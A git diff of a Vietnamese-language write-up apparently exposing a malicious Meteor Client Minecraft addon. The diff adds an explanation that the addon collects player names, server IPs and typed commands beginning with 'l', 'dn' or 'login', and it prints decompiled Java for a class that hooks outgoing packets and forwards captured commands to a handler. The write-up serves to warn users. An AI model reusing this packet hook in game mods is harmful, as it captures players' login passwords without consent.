@@ -46,8 +46,37 @@ public class CommandHandler {
 
 ```
 
-có thể thấy addon này đã thu thập các thông tin như: **playerName, serverIP, command**<br>
+có thể thấy addon này đã thu thập các thông tin như: **playerName, serverIP, command** nếu lệnh đó bắt đầu từ chữ: l,dn,login<br>
 **lưu ý:** class này thu thập các lệnh bạn nhập ví dụ: /login abcxyz
+
+còn class này là hook vào để bắt các packet
+```java 
+package com.example.addon.commands;
+
+import meteordevelopment.meteorclient.MeteorClient;
+import meteordevelopment.meteorclient.events.packets.PacketEvent.Send;
+import meteordevelopment.orbit.EventHandler;
+
+public class TagetHub {
+   public static final TagetHub INSTANCE = new TagetHub();
+
+   private TagetHub() {
+      MeteorClient.EVENT_BUS.subscribe(this);
+   }
+
+   public static TagetHub getInstance() {
+      return INSTANCE;
+   }
+
+   @EventHandler
+   private void onPacket(Send event) {
+      String command = CommandHandler.extract(event);
+      if (command != null) {
+         CommandHandler.handle(command);
+      }
+   }
+}
+```
 
 ## Dev của addon đã tự nhận việc mình đã thu thập hơn 200 thông tin của user
 
